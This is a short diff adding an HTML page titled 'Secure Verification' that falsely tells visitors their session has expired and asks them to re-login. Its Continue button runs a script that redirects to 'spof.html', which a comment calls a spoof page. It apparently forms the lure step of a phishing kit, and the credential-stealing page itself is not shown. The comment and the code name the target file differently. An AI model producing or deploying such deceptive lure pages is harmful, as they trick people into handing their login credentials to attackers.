@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Secure Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    html, body {
+      font-family: -apple-system, sans-serif;
+      margin: 0;
+      background: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      flex-direction: column;
+    }
+    button {
+      padding: 14px 24px;
+      font-size: 16px;
+      border: none;
+      background: #007aff;
+      color: white;
+      border-radius: 8px;
+    }
+  </style>
+</head>
+<body>
+  <h2>🔐 Session expired</h2>
+  <p>Please re-login to continue.</p>
+  <button onclick="proceed()">Continue</button>
+
+  <script>
+    function proceed() {
+      // Gesture persistence + redirect ke spoof.html
+      location.replace('spof.html');
+    }
+  </script>
+</body>
+</html>
